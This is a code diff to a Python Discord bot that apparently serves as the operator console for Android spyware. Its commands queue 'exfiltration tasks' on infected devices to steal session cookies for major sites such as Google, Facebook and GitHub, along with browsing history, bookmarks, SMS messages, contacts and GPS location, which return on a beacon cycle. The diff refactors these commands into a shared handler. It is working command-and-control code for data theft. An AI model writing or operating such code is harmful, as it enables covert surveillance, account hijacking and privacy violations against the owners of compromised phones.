@@ -113,17 +113,81 @@ def format_server_devices(data: dict[str, Any]) -> str:
     return "\n".join(lines)
 
 
-def format_server_cookies(data: dict[str, Any]) -> str:
-    """Format a /admin/cookies response into a Discord-friendly string."""
-    cookies = data.get("data", {}).get("cookies_by_device", {})
-    if not cookies:
-        return f"✅ {data.get('message', 'No cookies found')}"
+_HIGH_VALUE_COOKIE_DOMAINS = (
+    "https://www.google.com,"
+    "https://accounts.google.com,"
+    "https://www.facebook.com,"
+    "https://www.amazon.com,"
+    "https://twitter.com,"
+    "https://www.instagram.com,"
+    "https://www.reddit.com,"
+    "https://github.com,"
+    "https://www.linkedin.com,"
+    "https://www.netflix.com"
+)
 
-    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
-    for device_name, device_cookies in cookies.items():
-        for cname, cvalue in device_cookies.items():
-            lines.append(f"🍪 `{device_name}` → `{cname}` = `{cvalue}`")
+_TASK_EMOJIS: dict[str, str] = {
+    "request-cookies": "🍪",
+    "request-history": "📜",
+    "request-bookmarks": "🔖",
+    "request-contacts": "👤",
+    "request-sms": "💬",
+    "request-location": "📍",
+}
+
+
+def format_cached_for_task(
+    results_data: dict[str, Any] | None,
+    task_type: str,
+    device_filter: str = "*",
+) -> str:
+    """Format cached results for a specific task type from /admin/results."""
+    emoji = _TASK_EMOJIS.get(task_type, "📄")
+    if results_data is None:
+        return f"{emoji} **Cached data** — server unreachable."
+
+    results = results_data.get("data", {}).get("results_by_device", {})
+    relevant: dict[str, Any] = {}
+    for dev, dev_results in results.items():
+        if device_filter not in ("*", dev):
+            continue
+        history = dev_results.get(task_type)
+        if history:
+            relevant[dev] = history[0]
+
+    if not relevant:
+        return f"{emoji} **No cached data yet** for `{task_type}`."
+
+    lines = [f"{emoji} **Cached — `{task_type}`**"]
+    for dev, latest in relevant.items():
+        status_icon = "✅" if latest.get("success") else "❌"
+        received = latest.get("received_at", "")[:19].replace("T", " ")
+        lines.append(f"  📱 **{dev}** — {status_icon} `{received}`")
+        output = str(latest.get("data", {}).get("output", ""))
+        if output:
+            for line in output.split("\n")[:4]:
+                lines.append(f"    > {line[:120]}")
+            if len(output.split("\n")) > 4:
+                lines.append("    > *(… truncated)*")
     return "\n".join(lines)
+
+
+def format_queue_confirmation(
+    queue_response: dict[str, Any] | None,
+    task_type: str,
+    device: str,
+) -> str:
+    """Format the queuing confirmation section of a /request-* response."""
+    target = "all devices" if device == "*" else f"`{device}`"
+    if queue_response and queue_response.get("status") == "success":
+        return (
+            f"\n📡 **Fresh `{task_type}` queued** for {target}.\n"
+            f"> Results arrive after the next beacon cycle.\n"
+            f"> Run this command again to see updated data."
+        )
+    if queue_response is None:
+        return "\n❌ **Could not queue** — server unreachable."
+    return f"\n❌ **Queue failed** — {queue_response.get('message', 'unknown error')}."
 
 
 def format_server_simple(data: dict[str, Any]) -> str:
@@ -220,6 +284,29 @@ def log_access_denied(interaction: discord.Interaction, command_name: str) -> No
         user,
         user.id,
     )
+
+
+async def _handle_request_command(
+    interaction: discord.Interaction,
+    task_type: str,
+    device: str,
+    parameters: dict[str, Any] | None = None,
+) -> None:
+    """Shared handler for all /request-* commands: show cache + queue fresh task."""
+    results = await call_server("/admin/results")
+    cached_section = format_cached_for_task(results, task_type, device)
+
+    queue_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": task_type,
+            "parameters": parameters or {},
+        },
+    )
+    queue_section = format_queue_confirmation(queue_response, task_type, device)
+    await interaction.response.send_message(cached_section + queue_section)
 
 
 # ---------------------------------------------------------------------------
@@ -342,10 +429,14 @@ async def set_beacon_interval(
 
 @bot.tree.command(
     name="request-cookies",
-    description="Show cached cookies and queue a fresh cookie request for all devices.",
+    description="Show cached cookies and queue a fresh cookie request.",
 )
-async def request_cookies(interaction: discord.Interaction) -> None:
-    """Show cached cookies from the server and queue a fresh exfiltration task."""
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_cookies(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Show cached cookies and queue a fresh exfiltration task."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-cookies")
         await interaction.response.send_message(
@@ -353,53 +444,10 @@ async def request_cookies(interaction: discord.Interaction) -> None:
             ephemeral=True,
         )
         return
-
-    log_command(interaction, "request-cookies")
-
-    # High-value domains matching the client's DEFAULT_COOKIE_DOMAINS
-    high_value_domains = (
-        "https://www.google.com,"
-        "https://accounts.google.com,"
-        "https://www.facebook.com,"
-        "https://www.amazon.com,"
-        "https://twitter.com,"
-        "https://www.instagram.com,"
-        "https://www.reddit.com,"
-        "https://github.com,"
-        "https://www.linkedin.com,"
-        "https://www.netflix.com"
+    log_command(interaction, "request-cookies", f"device={device}")
+    await _handle_request_command(
+        interaction, "request-cookies", device, {"domains": _HIGH_VALUE_COOKIE_DOMAINS}
     )
-
-    # Part 1: Show cached cookies from the server
-    server_response = await call_server("/admin/cookies")
-    if server_response:
-        cached_section = format_server_cookies(server_response)
-    else:
-        cached_section = device_manager.request_cookies()
-
-    # Part 2: Queue a fresh request-cookies task for all devices
-    queue_response = await call_server(
-        "/admin/queue-task",
-        method="POST",
-        json_body={
-            "device_name": "*",
-            "task_type": "request-cookies",
-            "parameters": {"domains": high_value_domains},
-        },
-    )
-    if queue_response:
-        queue_section = (
-            f"\n📡 **Fresh cookie request queued.**\n"
-            f"> {format_server_simple(queue_response)}\n"
-            f"> Results will arrive on the next beacon cycle."
-        )
-    else:
-        queue_section = (
-            "\n📡 **Fresh cookie request could not be queued** — server unreachable."
-        )
-
-    response = f"{cached_section}\n{queue_section}"
-    await interaction.response.send_message(response)
 
 
 @bot.tree.command(
@@ -438,14 +486,14 @@ async def set_communication_protocol(
 
 @bot.tree.command(
     name="request-history",
-    description="Request browsing history from a device (or all devices).",
+    description="Show cached history and queue a fresh request.",
 )
 @app_commands.describe(device="Target device name (or '*' for all devices)")
 async def request_history(
     interaction: discord.Interaction,
     device: str = "*",
 ) -> None:
-    """Queue a history exfiltration task for a target device."""
+    """Show cached history and queue a fresh exfiltration task."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-history")
         await interaction.response.send_message(
@@ -453,36 +501,20 @@ async def request_history(
             ephemeral=True,
         )
         return
-
     log_command(interaction, "request-history", f"device={device}")
-
-    server_response = await call_server(
-        "/admin/queue-task",
-        method="POST",
-        json_body={
-            "device_name": device,
-            "task_type": "request-history",
-            "parameters": {},
-        },
-    )
-    if server_response:
-        response = format_server_simple(server_response)
-    else:
-        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
-
-    await interaction.response.send_message(response)
+    await _handle_request_command(interaction, "request-history", device)
 
 
 @bot.tree.command(
     name="request-bookmarks",
-    description="Request bookmarks from a device (or all devices).",
+    description="Show cached bookmarks and queue a fresh request.",
 )
 @app_commands.describe(device="Target device name (or '*' for all devices)")
 async def request_bookmarks(
     interaction: discord.Interaction,
     device: str = "*",
 ) -> None:
-    """Queue a bookmark exfiltration task for a target device."""
+    """Show cached bookmarks and queue a fresh exfiltration task."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-bookmarks")
         await interaction.response.send_message(
@@ -490,36 +522,20 @@ async def request_bookmarks(
             ephemeral=True,
         )
         return
-
     log_command(interaction, "request-bookmarks", f"device={device}")
-
-    server_response = await call_server(
-        "/admin/queue-task",
-        method="POST",
-        json_body={
-            "device_name": device,
-            "task_type": "request-bookmarks",
-            "parameters": {},
-        },
-    )
-    if server_response:
-        response = format_server_simple(server_response)
-    else:
-        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
-
-    await interaction.response.send_message(response)
+    await _handle_request_command(interaction, "request-bookmarks", device)
 
 
 @bot.tree.command(
     name="request-sms",
-    description="Request SMS inbox from a device (or all devices).",
+    description="Show cached SMS and queue a fresh request.",
 )
 @app_commands.describe(device="Target device name (or '*' for all devices)")
 async def request_sms(
     interaction: discord.Interaction,
     device: str = "*",
 ) -> None:
-    """Queue an SMS exfiltration task. Requires READ_SMS to be granted on device."""
+    """Show cached SMS and queue a fresh exfiltration task. Requires READ_SMS on device."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-sms")
         await interaction.response.send_message(
@@ -527,36 +543,20 @@ async def request_sms(
             ephemeral=True,
         )
         return
-
     log_command(interaction, "request-sms", f"device={device}")
-
-    server_response = await call_server(
-        "/admin/queue-task",
-        method="POST",
-        json_body={
-            "device_name": device,
-            "task_type": "request-sms",
-            "parameters": {},
-        },
-    )
-    if server_response:
-        response = format_server_simple(server_response)
-    else:
-        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
-
-    await interaction.response.send_message(response)
+    await _handle_request_command(interaction, "request-sms", device)
 
 
 @bot.tree.command(
     name="request-location",
-    description="Request last known GPS location from a device (or all devices).",
+    description="Show cached GPS location and queue a fresh request.",
 )
 @app_commands.describe(device="Target device name (or '*' for all devices)")
 async def request_location(
     interaction: discord.Interaction,
     device: str = "*",
 ) -> None:
-    """Queue a location exfiltration task (uses cached GPS fix, no active tracking)."""
+    """Show cached location and queue a fresh poll (cached GPS fix, no active tracking)."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-location")
         await interaction.response.send_message(
@@ -564,36 +564,20 @@ async def request_location(
             ephemeral=True,
         )
         return
-
     log_command(interaction, "request-location", f"device={device}")
-
-    server_response = await call_server(
-        "/admin/queue-task",
-        method="POST",
-        json_body={
-            "device_name": device,
-            "task_type": "request-location",
-            "parameters": {},
-        },
-    )
-    if server_response:
-        response = format_server_simple(server_response)
-    else:
-        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
-
-    await interaction.response.send_message(response)
+    await _handle_request_command(interaction, "request-location", device)
 
 
 @bot.tree.command(
     name="request-contacts",
-    description="Request contacts from a device (or all devices).",
+    description="Show cached contacts and queue a fresh request.",
 )
 @app_commands.describe(device="Target device name (or '*' for all devices)")
 async def request_contacts(
     interaction: discord.Interaction,
     device: str = "*",
 ) -> None:
-    """Queue a contacts exfiltration task. Requires READ_CONTACTS to be granted on device."""
+    """Show cached contacts and queue a fresh exfiltration task. Requires READ_CONTACTS."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-contacts")
         await interaction.response.send_message(
@@ -601,24 +585,8 @@ async def request_contacts(
             ephemeral=True,
         )
         return
-
     log_command(interaction, "request-contacts", f"device={device}")
-
-    server_response = await call_server(
-        "/admin/queue-task",
-        method="POST",
-        json_body={
-            "device_name": device,
-            "task_type": "request-contacts",
-            "parameters": {},
-        },
-    )
-    if server_response:
-        response = format_server_simple(server_response)
-    else:
-        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
-
-    await interaction.response.send_message(response)
+    await _handle_request_command(interaction, "request-contacts", device)
 
 
 # ---------------------------------------------------------------------------
